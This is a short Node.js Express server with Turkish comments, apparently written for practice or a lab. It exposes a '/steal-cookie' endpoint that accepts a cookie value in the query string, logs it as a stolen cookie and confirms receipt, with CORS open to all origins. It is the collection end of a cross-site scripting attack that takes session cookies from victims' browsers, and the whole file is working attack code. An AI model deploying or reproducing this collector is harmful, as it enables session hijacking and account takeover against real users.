const express = require('express');
const cors = require('cors');  // CORS modülünü dahil et
const app = express();
const port = 3000;

// CORS'u etkinleştir
app.use(cors());

// Çalınan cookie'yi alacak endpoint
app.get('/steal-cookie', (req, res) => {
    const cookie = req.query.cookie;  // URL parametresinden cookie'yi al
    console.log(`Çalınan cookie: ${cookie}`);  // Cookie'yi konsola yazdır
    res.send('Cookie alındı!');
});

// Sunucuyu başlat
app.listen(port, () => {
    console.log(`Sunucu http://localhost:${port} adresinde çalışıyor`);
});